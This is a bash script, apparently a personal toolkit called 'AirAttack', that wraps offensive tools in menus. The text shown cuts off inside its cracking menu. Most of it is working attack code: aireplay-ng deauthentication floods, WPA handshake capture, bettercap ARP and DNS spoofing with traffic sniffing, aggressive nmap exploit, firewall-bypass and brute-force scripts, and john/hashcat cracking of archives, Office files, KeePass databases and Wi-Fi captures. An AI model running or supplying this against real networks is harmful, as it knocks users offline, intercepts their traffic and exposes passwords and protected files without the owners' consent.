#!/bin/bash



# ══════════════════════════════════════════════════════════════════════════════
#   CONFIG LOGIC
# ══════════════════════════════════════════════════════════════════════════════


#ROOT CHECK
if [[ $EUID -ne 0 ]]; then
    err "Run as root: sudo ./airattack.sh"
    exit 1
fi

#script starts
#→ bash checks who is running it
#→ if their EUID is not 0 (not root)
#→ print error and exit with code 1
#→ if EUID is 0 (root) → condition is false → skip block → continue

DEPS=(aircrack-ng airodump-ng aireplay-ng bettercap nmap john hashcat figlet xterm hcxpcapngtool crunch iw)

check_deps () {
    for dep in "${DEPS[@]}"; do
        if command -v "$dep" &>/dev/null; then
            info "$dep found"
        else
            err "$dep not found"
        fi
    done
    read -p "Press [Enter] to continue..."
}

#Loops through every tool in DEPS
#command -v checks if it exists in PATH
#Found → green [*] message
#Not found → red [!] message
#Shows all results then waits for enter

# ══════════════════════════════════════════════════════════════════════════════
# INTERFACE SELECTION LOGIC
# ══════════════════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════════════════
# INTERFACE SELECTION LOGIC
# ══════════════════════════════════════════════════════════════════════════════
select_interface () {
    # Parse `iw dev` blocks: pair each "Interface X" with its following "type Y"
    mapfile -t WIFI_IFACES < <(
        iw dev | awk '
            /^\s*Interface/ { iface=$2 }
            /^\s*type/      { if (iface != "" && $2 == "managed") print iface; iface="" }
        '
    )

    if [[ ${#WIFI_IFACES[@]} -eq 0 ]]; then
        err "No managed-mode wireless interfaces found."
        err "If you had a monitor interface running from a previous session, clean it up first (option 2)."
        exit 1
    fi

    info "Available wireless interfaces:"
    local i=1
    for iface in "${WIFI_IFACES[@]}"; do
        printf "${ORANGE}%d) %s${NC}\n" "$i" "$iface"
        ((i++))
    done

    read -rp "$(printf "${MAGENTA}Select interface (1-${#WIFI_IFACES[@]}): ${NC}")" pick
    if [[ $pick =~ ^[0-9]+$ ]] && (( pick >= 1 && pick <= ${#WIFI_IFACES[@]} )); then
        INTER="${WIFI_IFACES[$((pick-1))]}"
    else
        err "Invalid selection — defaulting to ${WIFI_IFACES[0]}"
        INTER="${WIFI_IFACES[0]}"
    fi

    # Guard: never append "mon" onto something that's already a monitor-style name
    if [[ "$INTER" == *mon ]]; then
        err "Selected interface '$INTER' already looks like a monitor interface — aborting."
        exit 1
    fi

    INTERFACE="${INTER}mon"
    info "Managed: $INTER  |  Monitor: $INTERFACE"
    read -p "Press [Enter] to continue..."    
    #Here's a function that detects all wireless interfaces via iw dev, lets you pick one if there's more than one, and sets $INTER (and derives $INTERFACE as its monitor-mode name dynamically instead of hardcoding wlan0mon):
}

# ══════════════════════════════════════════════════════════════════════════════
# CONGIGURATION
# ══════════════════════════════════════════════════════════════════════════════
print_banner() {
    echo -e "${RED}"
    figlet -f slant "AirAttack"
    echo -e "${NC}"
    echo -e "${CYAN}        Wireless Audit Toolkit${NC}"
    echo
}

print_banners () {
    echo -e "${RED}"
    figlet -f slant "Offline Cracking"
    echo -e "${NC}"
    echo -e "${CYAN}        Wireless Audit Toolkit${NC}"
    echo
}

bettercap_banner () {
    echo -e "${RED}"
    figlet -f slant "SwissCap"
    echo -e "${NC}"
    echo -e "${CYAN}       Toolkit${NC}"
    echo
}

nmap_banner () {
    echo -e "${RED}"
    figlet -f slant "AirScan"
    echo -e "${NC}"
    echo -e "${CYAN}       Toolkit${NC}"
    echo
}

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
ORANGE='\033[38;5;208m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
DIMMER='\033[2;90m'
NC='\033[0m'


GOTO_MAIN=0 #GOTO_MAIN=0 — global flag, starts as 0 (false).
INTERFA="wlan1"
ap="" #to announce it globally 
ch=""
SUBNET=""
cp=""
pac=""
info() { printf "${GREEN}[*] $1${NC}\n"; } #$1 means here that every part inside ""
err()  { printf "${RED}[!] $1${NC}\n"; }
warn() { printf "${YELLOW}[!] $1${NC}\n"; }
prin() { printf "${BLUE} $1${NC}\n";}
pp () { printf "${BOLD}${RED} $1 ${NC}\n";}
pt () { printf "${DIMMER}${YELLOW}${DIM} $1 ${NC}\n";}
into () { printf "${BOLD}${MAGENTA} $1${NC}\n";}	
to () { printf "${BOLD}${GREEN} $1${NC}\n";}
out () { printf "${BOLD}${RED} $1${NC}\n";}


SUNET=$(ip route | grep -v default | grep "$INTER" | awk '{print $1}')
#This grabs the local subnet automatically from the interface — no manual input needed. 



prin_banner() {
    echo -e "${GREEN}"
    figlet -f slant "MAIN MENU"
    echo -e "${NC}"
    echo -e "${CYAN}        Toolkit${NC}"
    echo
}

workflow() {
    pp "$(printf "%-18s%-19s%-16s%-20s%-19s%-22s" "[WiFi]" "[Bettercap]" "[Nmap-NetIP]" "[Nmap-OtherIP]" "[Metasploit]" "[Hashcat]")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Monitor Mode" "├──Scan" "├──Scan Host" "├──Scan" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Managed Mode" "├──Select AP" "├──Open Port" "├──Runtime" "├──N/A" "├──N/A")"			#%-22s fixed width keeps columns locked regardless of terminal tab width
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Scan" "├──DNS+ARP Spoof" "├──Service" "├──Security" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Deauth" "├──Packet Sniffing" "├──Security" "├──Last Patched" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Handshake" "├──MITM" "└──Version" "└──Active User" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-14s%-25s%-22s" "└──PMKID" "└──Packets" "" "" "└──N/A" "└──N/A")"
    printf "\n"
}

# ══════════════════════════════════════════════════════════════════════════════
# FUCTIONS LOGIC
# ══════════════════════════════════════════════════════════════════════════════
run () {
	
		clear	
		prin_banner
		#prin "Script Loading....."
		#sleep 1
		check_deps
		clear
		#prin "Loading....."
		#sleep 1
		select_interface
}

# ══════════════════════════════════════════════════════════════════════════════
# WIFI LOGIC
# ══════════════════════════════════════════════════════════════════════════════

cleanup () {

    warn "Deleting monitor interface $INTERFACE..."
    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
	}
}

wlan_checker () {
        if ! ip link show "$INTER" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTER not found — Enable it First"
        return 1
		fi
}

create () {

 # ══════════════════════════════════════════════════════
 #Creating Virtual Monitor INTERFACE
 # ══════════════════════════════════════════════════════

    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
    }

    info "Creating monitor interface $INTERFACE on $INTER...\n"
    if 
        sudo iw dev "$INTER" interface add "$INTERFACE" type monitor; then
        sudo ip link set "$INTERFACE" up
        echo -e "${GREEN}$INTERFACE ready ${NC}"
    else
        err "Could not create $INTERFACE — is $INTER available?"
        printf "${RED}Check: iw dev ${NC}"
        exit 1
    fi

    read -p "Press [Enter] key to continue..."
}

delete () {

    # ══════════════════════════════════════════════════════
    #Deleting Virtual Monitor if avilable
    # ══════════════════════════════════════════════════════
    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
    }
    info "Interface Restored"
    read -p "Press [Enter] key to continue..."
}

show_target() {
    echo -e "${BLUE}╔═══════════════════════════════╗${NC}"
    if [[ -z $ap ]]; then
        echo -e "${BLUE}║    ${BOLD}AP: ${RED}Not Selected${NC}${BLUE}\t\t║${NC}"
        echo -e "${BLUE}║    ${BOLD}CH: ${RED}Not Selected${NC}${BLUE}\t\t║${NC}"
    else
        echo -e "${BLUE}║    ${BOLD}AP: ${GREEN}$ap${NC}${BLUE}\t║${NC}"
        echo -e "${BLUE}║    ${BOLD}CH: ${GREEN}$ch${NC}${BLUE}\t\t\t║${NC}"
    fi
    echo -e "${BLUE}╚═══════════════════════════════╝${NC}"
}

wifi_scan () {

  mon_checker || return 1

 #    ip link show "$INTERFA" >/dev/null 2>&1 && { #Deletes wlan1 if avilable for only pmkid
 #    sudo ip link set "$INTERFA" down 2>/dev/null
 #    sudo iw dev "$INTERFA" del 2>/dev/null
 #    }


 # ══════════════════════════════════════════════════════
 #Scanning Process
 # ══════════════════════════════════════════════════════
  rm -f scan-* 2>/dev/null 
    read -rp "$(printf "${PURPLE} Scanning Time... ${NC}\n")" sec
    timeout "$sec" airodump-ng "$INTERFACE" --write scan --output-format csv 2>/dev/null &
    SCAN_PID=$!

    wait $SCAN_PID #this make the script for 15 sec
    printf "${GREEN}Scan Finished${NC}\n"

 # ══════════════════════════════════════════════════════
 #Selection Part
 # ══════════════════════════════════════════════════════
    awk -F',' 'NR>2 && $1 ~ /^[0-9A-Fa-f]{2}:/ && $4 !~ /-/ {
    count++
    printf "\033[1;31m%d. %s, %s\033[0m\n", count, $1, $4
    }' scan-01.csv | sed 's/\x1b\[[0-9;]*m//g' > /tmp/scan_results.txt 
	

	


 #-F',' is setting seperator as comma and become colomn,,NR-numberline and >2 means leave these 2 lines,,$4 !~ /-/ — skip any line where column 4 contains a -,,,count ++ create numbers and extra + is to add one 
 #sed 's/\x1b\[[0-9;]*m//g' — strips all color escape codes before saving to the file, so $ap and $ch are clean when extracted.;;;%d — prints the number,,%s — prints the field value,,\033[1;31m — RED color (same as your $RED variable, but awk can't use bash variables directly),,, >  /tmp/scan_results.txt saves the output data and from where the read selectionis done
   #	cat /tmp/scan_results.txt
   scan_check

    read -rp "$(printf "${PURPLE}${BOLD}Select target (1-$(wc -l < /tmp/scan_results.txt)): ${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available

    ap=$(awk -F'[,.]' -v pick="$PICK" 'NR==pick {gsub(/ /, "", $2); print $2}' /tmp/scan_results.txt)
    ch=$(awk -F',' -v pick="$PICK" 'NR==pick {gsub(/ /, "", $2); print $2}' /tmp/scan_results.txt)

 # ══════════════════════════════════════════════════════
 #checking Part
 # ══════════════════════════════════════════════════════

    if [[ -n $ap ]]; then
        printf "${GREEN} AP Selection Successful ${NC}\n"
    else
        printf "${RED} AP Selection Failed ${NC}\n"
        return 1
    fi

        if [[ -n $ch ]]; then
        printf "${GREEN} Channel Selection Successful ${NC}\n"
    else
        printf "${RED} Channel Selection Failed ${NC}\n"
        return 1
    fi
    rm /tmp/scan_results.txt 2>/dev/null 
    read -p "Press [Enter] key to continue..."
}

scan_check () {
	
	if [[ -f /tmp/scan_results.txt ]]; then
		 cat /tmp/scan_results.txt
	else 
		err "Scan file not created try again"
		return 1
	fi
}

wifi_deauth () {
    printf "${PURPLE}${BOLD} Starting... ${NC}\n"
 if [[ -z $ap ]]; then
         err "Run Target Scan First"
 else
    mon_checker || return 1 #|| means "if the left side fails, do the right side" — so if mon_checker returns 1 (failure), it immediately does return 1 and exits the function.
    sudo iwconfig $INTERFACE channel $ch
    # xterm=open new terminal,,,-e = to run command in terminal,,,& — run in background so your main script continues;;;; bash — after the command finishes (or errors), drops into a bash shell keeping the window open so you can see the output/error.
    #read -rp expects a string as the prompt, not a command. So you use $() to convert the printf output into a string first.
    read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client\n\t\tFor all leave empty): ${NC}\t")" cp
    read -rp "$(printf "${MAGENTA}Deauth Packets Numbers(0 for infinite): ${NC}\t")" pac
    if [[ -z $pac ]]; then
        printf "${RED}Number of packets is not selected ${NC}\n"
        return 1
    fi
    #-z = zero length (empty)
    #-n = non zero length (has data)
    #rempve bash and exit if any error occur in xterm terminal
    
    if [[ -z $cp ]]; then
        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
    else
        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
    fi
 fi
    read -p "Press [Enter] key to continue..."
}

mon_checker () {
        if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTERFACE not found — Create Monitor Mode first"
        return 1
		fi
}

wifi_handshake () {
    printf "${PURPLE} Capturing... ${NC}\n"
 if [[ -z $ap ]]; then
        err "Run Target Scan First"
 else

 handshake_check    

    #-w handshake — save capture to handshake-01.cap,,,--output-format pcap — save as pcap format (needed for cracking later)
    mon_checker || return 1
    read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client or For all leave empty): ${NC}\t")" cp
    sudo iwconfig $INTERFACE channel $ch
    
    

    read -p "Press [Enter] key to continue..."  

    if [[ -z $cp ]]; then
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE; bash" &
        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one; bash" &
    else
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid "$ap" -c "$ch" -w handshake --output-format pcap $INTERFACE; bash" &
        xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one; bash" &
    fi
    sleep 2
    read -rp "$(printf "${MAGENTA}Press Enter to verify handshake...${NC}")"
    if 
        aircrack-ng handshake* 2>&1 | grep -q "1 handshake"; then
        printf "${GREEN}Handshake captured successfully!${NC}\n"
    else
        printf "${RED}No handshake* found — try again${NC}\n"
        printf "${RED}No Handshake Found Removing File 'handshake-01.cap' ${NC}\n"
        rm handshake*
    fi
 fi
    read -p "Press [Enter] key to continue..."
 #grep -q "1 handshake" — silently checks if the output contains that string, returns true/false.

}

wifi_pmkid () {
    info " PMKID tool not available...\n"
 #    printf "${PURPLE} PMKID Capturing... ${NC}\n"

 # ══════════════════════════════════════════════════════
 #Deleting and creating new wlan1
 # ══════════════════════════════════════════════════════
 #   printf "${RED}Deleting monitor interface $INTERFACE... ${NC}"
 #    ip link show "$INTERFACE" >/dev/null 2>&1 && {
 #   sudo ip link set "$INTERFACE" down 2>/dev/null
  #  sudo iw dev "$INTERFACE" del 2>/dev/null
   # }

    #printf "${MAGENTA}Creating interface $INTERFA.....${NC}\n"
    #if 
    #    sudo iw dev "$INTER" interface add "$INTERFA" type managed; then
    #    sudo ip link set "$INTERFA" up
    #    sudo nmcli dev set $INTERFA managed no  # ← tell NM(Network Manager) to leave wlan1 alone
    #    echo -e "${GREEN}$INTERFA ready ${NC}"
    #else
    #    printf "${RED}Could not create $INTERFA — is $INTER available? ${NC}"
    #    printf "${RED}Check: iw dev ${NC}"
    #   return 1
    #fi

 #--filterlist_ap=$ap — target only your AP;;;--filtermode=2 — whitelist mode (only capture specified AP);;;-w pmkid.pcapng — save output file
    #xterm -bg black -fg cyan -title "PMKID Capture" -e "hcxdumptool -i ${INTERFA} -c ${ch}a -w pmkid.pcapng --exitoneapol=1; bash" &
 read -p "Press [Enter] key to continue..."
}

handshake_check () {
	    
	if ls handshake* 2>/dev/null | grep -q .; then  #ls handshake* 2>/dev/null — lists matching files, suppresses error if none found. grep -q . — returns true if any output exists (at least one file matched).
    rm -f handshake-* 2>/dev/null					#better for this tyoe if [[ -f handshake* ]]; then
    warn "Handshake file removed"
    else 
		warn "No Previous Handshake file"
    fi
	read -p ">>"
}
# ══════════════════════════════════════════════════════════════════════════════
#      WIFI MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

wifi_menu() {
    while true; do
        clear
        print_banner
        show_target

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${GREEN}${BOLD}              RECONNAISSANCE             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${ORANGE}1. Switch to Monitor Mode${NC}\n"
        printf "${ORANGE}2. Switch to Managed Mode${NC}\n"
        printf "${ORANGE}3.🔍 Target Scan(Monitor Mode Required) ${NC}\n"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${RED}${BOLD}               ATTACK             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${GREEN}4.☠️ Deauth Attack ${NC}\n"
        printf "${GREEN}5.🫱🏻‍🫲🏿 HandShake Capture ${NC}\n"
        printf "${GREEN}6.🫣 PMKID Capture ${NC}\n"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${YELLOW}${BOLD}               Main Menu             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${RED}0.🔙 Main Menu ${NC}\n"

    read -rp " $(printf "${BOLD}Choose Option(0-6) ==> ${NC}")" wifi

    case $wifi in 
        1) wlan_checker
			create;;
        2) delete;;
        3) wifi_scan;;
        4) wifi_deauth;;
        5) wifi_handshake;;
        6) wifi_pmkid;;
        0) if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
			info "Exiting AirAttack"
			#sleep 2
			break
		   else
				read -rp "$(printf "${MAGENTA} Want Persistant Monitor Mode (y/n)::\t ${NC}")" yes
				if [[ $yes = y ]]; then
					break
				else
					cleanup 
				break
					fi	
			fi ;;

			
		*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"

    esac
done
}


# ══════════════════════════════════════════════════════════════════════════════
# 		BETTERCAP LOGIC
# ══════════════════════════════════════════════════════════════════════════════

sunet () {
    local label
    if [[ -z $SNET ]]; then
        label="Not Selected"
    else
        label="$SNET"
    fi

    # Fixed inner width = 29 chars (between ║ and ║)
    local inner="Target: $label"
    local padded
    padded=$(printf "%-29s" "$inner")   # left-align, pad to 29

    echo -e "${MAGENTA} ╔═══════════════════════════════╗${NC}"
    into "║${BOLD}${RED}${padded}${NC}${MAGENTA}  ║${NC}"
    echo -e "${MAGENTA} ╚═══════════════════════════════╝${NC}"
}

scan () {
	read -rp "$(printf "${GREEN} Scan time(sec)....")" sec
	sudo bettercap -iface "$INTER" -eval "net.recon on; net.probe on; wifi.recon on; sleep $sec; net.show; wifi.show; exit" 2>/dev/null
}

better_menu () {
    read -rp "$(info "Enter Network IP or press [ENTER] for $SUNET:.... ")" input
    if [[ -z $input ]]; then
        SNET="$SUNET"
    else
        SNET="$input"
    fi
    info "Target set to: $SNET"
    read -rp "$(printf "${MAGENTA}Press Enter to continue...${NC}")"
}

spoof () {
	
	read -rp "$(info "Domain to spoof or ${RED}[All]: ")" DOMA
    if [[ -n $DOMA ]]; then
        DOMAIN="$DOMA"
    else
        DOMAIN="*"
    fi
    info "Domain set to: $DOMAIN"
    
    read -rp "$(info "Location where to spoof or ${RED}Default[Google]: ")" FAKE_IP
    if [[ -n $FAKE_IP ]]; then
        FAKE="$FAKE_IP"
    else
        FAKE="8.8.8.8"
    fi
    info "Spoofing set to: $FAKE"
    
    read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Spoofing time(sec)....")" sec
    
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set dns.spoof.domains $DOMAIN;
        set dns.spoof.address $FAKE;
        dns.spoof on;
        sleep $sec;
        exit; "
}

mitm () {
     read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Sniff time(sec)....")" sec
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set net.sniff.verbose true;
        set net.sniff.output /tmp/sniff_$(date +%F_%T).pcap;
        net.sniff on;
        sleep $sec;
        exit
    "
}


# ══════════════════════════════════════════════════════════════════════════════
# 		BETTERCAP MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

bettercap_menu () {
	
		clear
		while true; do 
		
		bettercap_banner 
		sunet
		
		info "-----Choose Menu-----"
			into "1) Scan Network"
			into "2) Select Network"
			into "3) DNS+ARP Spoof"
			into "4) MITM"
			out "0) Main Menu"
			
		read -p ">>" choice
		
			case $choice in 
				
				1)scan;;
				
				2)better_menu;;
				
				3)spoof;;
				
				4)mitm;;
				
				0) break;;
				
				*) err "Wrong Choice [ENTER]"
					read -p ">>"
					continue ;;			
			esac
		done
}

# ══════════════════════════════════════════════════════════════════════════════
# NMAP LOGIC
# ══════════════════════════════════════════════════════════════════════════════

ip_check () {
 if [[ ! $SUBNET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(\/[0-9]+)?$ ]]; then  # checks if $SUBNET looks like 192.168.1.0 or 192.168.1.0/24. If not, error and return
    err "Invalid IP/CIDR format: $SUBNET"
    read -p "Press [Enter] to continue..."
    return 1
 fi
}

network () {
	
	while true; do 
	ip_check
	info "$SUBNET"
	info "---Make a choice---"
		into "1) Hosts Scan"
		into "2) Ports"
		into "3) Service"
		into "4) Security & Firewall"
		into "5) OS Version"
		out "0) Back"
		out "00) Main Menu"
		
	read -p ">>" choice
	
	case $choice in 
		
		1) sudo nmap -sn --send-eth --resolve-all -T4 $SUBNET;;

		2) read -rp "$(printf "${ORANGE}Scan all ports? (y/n): ${NC}")" allports
			if [[ $allports = y ]]; then
				sudo nmap -p- --open -T4 -n --min-rate 5000 $SUBNET
			else
			read -rp "$(printf "${ORANGE}Enter port/range (e.g. 80 or 1-1000): ${NC}")" PORT
			sudo nmap -p "$PORT" -sV -sC -O -A --open -T4 \
			--script=banner,vulners,exploit \
			$SUBNET			
			fi;;		
			
		3) sudo nmap -sV --version-intensity 7 -p- -T4 --min-rate 3000 --script=banner,http-headers,http-title,ssh-hostkey,ftp-anon,smtp-commands,http-enum,ssl-cert,dns-service-discovery,http-server-header $SUBNET;;

		4) sudo nmap -sS -Pn --open -T4 --min-rate 3000 --script=ipidseq,snmp-info,auth,dns-recursion,dns-cache-snoop,broadcast-dns-service-discovery $SUBNET;;

		5) sudo nmap -O --osscan-guess --fuzzy -T4 --script=nbstat,smb-os-discovery,broadcast-dhcp-discover $SUBNET;;
    
		0) break;;
		
		00) GOTO_MAIN=1; break;;
		#00 — set flag to 1 (true), then break out of network loop. Control returns to wherever network was called from (nmap_menu).
		
		*);;
		
	esac
	done
}

other () {
	
	while true; do 
	ip_check
	info "$SUBNET"
		into "1) IP Scan"
		into "2) Server Runtime"
		into "3) Server Security,Firewall"
		into "4) Last Patched"
		into "5) Active Users"
		out "0) Back"
		out "00) Main Menu"
	
	read -p ">>" choice
	
	case $choice in 
		
		1) sudo nmap -Pn -sn --reason $SUBNET \
			--script=asn-query,whois-ip,ip-geolocation-ipinfodb;;
		
		2) sudo nmap -sV -sS -Pn $SUBNET \
			--script=uptime-agent,snmp-sysdescr,clock;;
		
		3) sudo nmap -sS -sA -Pn -T4 $SUBNET \
			--script=firewalk,firewall-bypass,vulners,exploit,auth,\
			http-shellshock,http-put,http-git,ftp-anon,\
			smb-vuln-ms17-010,ssl-heartbleed;;
		
		4) sudo nmap -sV -sU -O -Pn -p 161,445,22 $SUBNET \
			--script=snmp-sysdescr,snmp-win32-updates,\
			smb-os-discovery,banner;;
		
		5) sudo nmap -sV -Pn -p 22,445,161,79 $SUBNET \
			--script=finger,smb-enum-users,smb-enum-sessions,\
			snmp-win32-users,users-brute;;
		
		0) break;;
		
		00) GOTO_MAIN=1; break;;
		
		*);;
		
	esac
	done
}

# ══════════════════════════════════════════════════════════════════════════════
# NMAP MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

nmap_menu () {		
	while true; do
		clear
		nmap_banner
		
		into "1) Network IP"
		into "2) Other IP"
		out "0) Main Menu"
	
	read -rp "$(printf "${BOLD}${DIM}${GREEN}Choose any option ==>${NC}\t")" choice
	
	case $choice in 
	
			1) read -rp "$(info "Enter the Network IP or Leave Blank")" SUBNET
               [[ -z $SUBNET ]] && SUBNET=$(ip route | grep -v default | grep "$INTER" | awk '{print $1}') #Logic is that if -z is false (string is not empty) so it skips the auto-fill line and uses whatever the user typed directly — $SUBNET stays as their input and network runs with it.
               network
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            
            2) if ! ping -c 1 -W 2 8.8.8.8 &>/dev/null; then
				err "No internet connection — geolocation scripts need internet"
				read -p "Press [Enter] to continue..."
				return 0
				fi
            
            read -rp "$(info "Enter the Network IP or Leave Blank")" SUBNET
               [[ -z $SUBNET ]] && SUBNET=$(ip route | grep -v default | grep "$INTER" | awk '{print $1}')
               other
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;; #After nmap_main (which called network) returns — check the flag. If it's 1, reset it to 0 and break out of nmap_menu loop. Control returns to main menu.
            
		
		0) info "Bye Bye"
			break ;;
			
		*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
			continue ;;
	
	
	esac	
	done
}

# ══════════════════════════════════════════════════════════════════════════════
# 		HASHCAT Logic
# ══════════════════════════════════════════════════════════════════════════════

crack () {
	
		warn "Removing any precious caches"
		read -rp "$(printf "${RED}${BOLD} Press [ENTER] to continue${NC}")"
	    rm -f "/home/$(logname)/hash.txt"
		rm -f "/home/$(logname)/.john/john.pot"
		info "SUPPORTED FILE::: ZIP, RAR, PDF, 7Z, CAP, OFFICE (doc/docx/xls/xlsx/ppt/pptx), KDBX (keepass)"
		file_selection || return 1
		file_extension || return 1


}

generate () {
		
		info "Creating a permanent wordlist inside /home/$(logname)/filename.txt"
		read -rp "$(printf "${ORANGE} Min Character ${NC}\t")" min
		read -rp "$(printf "${ORANGE} Max Character ${NC}\t")" max
		read -rp "$(printf "${ORANGE} Character ${NC}\t")" char
		read -rp "$(printf "${ORANGE} File Name ${NC}\t")" fill
		read -p "press [ENTER] to continue"
		
		crunch $min $max $char -o $fill.txt
		
		info "File Generated"
		read -p "press [ENTER] to continue"
	
	}

file_selection () {
	
	while true; do
	info "File Should Be In Script Home Directory"
	read -rp "$(printf "${YELLOW}Choose a file: ${NC}")" file

    if [[ -f $file ]]; then
        info "File Valid"
        read -p "Press [Enter] key to continue..."
        return 0 # if not applied ask again and again fo file name
    else
        err "Wrong File/Wrong Name try again"
		read -p "Press [Enter] key to continue..."
    fi
	done
}

file_extension () {
	
	info "Choose a file Extension...."
	
	while true; do
		prin "1)ZIP"
		prin "2)RAR"
		prin "3)PDF"
		prin "4)7Z"
		prin "5)CAP"
		prin "6)KEEPASS"
		prin "7)OFFICE"
		prin "0)Select File Again"		
	
	read -p ">>" extension
	
	case $extension in 
		1) zip_run; return 0;;
		2) rar_run; return 0;;
		3) pdf_run; return 0;;
		4) sevenzip_run; return 0;;
		5) cap_run; return 0;;
		6) keepass_run; return 0;;
		7) office_run; return 0;;
		0) return 0 ;;
		*) err "Choose Correct Number (1-6)"
			read -p "Press [Enter] to continue"
			;;
	esac
	done
}

zip_run () {
	
	
	read -p "Press [Enter] to begin cracking"
	
	info "Extracting HASH From $file"
	zip2john $file > hash.txt  #zip2john — reads the ZIP file's encryption header ;;;myfile.zip — your target file ;;; > hash.txt — saves the extracted hash to a file
	
	read -p "Press [Enter] to begin cracking"
	
	john --wordlist=op.txt hash.txt
	
	john --show hash.txt
	
    read -p "Press [Enter] to return to menu"
    return 0
    
}

rar_run () {
		
		info "Extracting HASH From $file"
		rar2john $file > hash.txt
	
		read -p "Press [Enter] to begin cracking"
		john --wordlist=op.txt hash.txt
	
		john --show hash.txt
	
		read -p "Press [Enter] to return to menu"
		return 0
	
}
	
pdf_run () {
		
		info "Extracting HASH From $file"
		pdf2john $file > hash.txt
	
		read -p "Press [Enter] to begin cracking"
		john --wordlist=op.txt hash.txt
		
		john --show hash.txt
	
		read -p "Press [Enter] to return to menu"
		return 0
	
}

sevenzip_run () { #Note: function name 7zip_run starting with a digit is invalid in bash — function names can't start with a number.
		
		info "Extracting HASH From $file"
		7z2john $file > hash.txt
	
		read -p "Press [Enter] to begin cracking"
		john --wordlist=op.txt hash.txt
	
		john --show hash.txt
	
		read -p "Press [Enter] to return to menu"
		return 0
	
}

cap_run () {
		
		info "Extracting HASH From $file"
		hcxpcapngtool -o handshake.hc22000 $file
		
		read -rp "$(printf "${DIM} Wordlist Name${NC}\t")" full
		read -p "Press [Enter] to begin cracking"
		hashcat -m 22000 handshake.hc22000 /home/$(logname)/$full
		
		#sudo -E hashcat -m 22000 handshake.hc22000 one.txt --force  #without sudo -E (lost the RUSTICL_ENABLE env var)
		hashcat -m 22000 -D 1,2 -a 0 handshake.hc22000 test.txt -O -w 3 --force
		
		read -p "Press [Enter]"
		return 0
}

keepass_run () {
		
		info "Extracting HASH From $file"
		keepass2john $file > hash.txt
	
		read -p "Press [Enter] to begin cracking"
		john --wordlist=op.txt hash.txt
	
		john --show hash.txt
	
		read -p "Press [Enter] to return to menu"
		return 0
	
}

office_run () {
		
		info "Extracting HASH From $file"
		office2john $file > hash.txt
	
		read -p "Press [Enter] to begin cracking"
		john --wordlist=op.txt hash.txt
	
		john --show hash.txt
	
		read -p "Press [Enter] to return to menu"
		return 0
	
}

# ══════════════════════════════════════════════════════════════════════════════
# 		HASHCAT MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

crack_menu () {
    while true; do
    
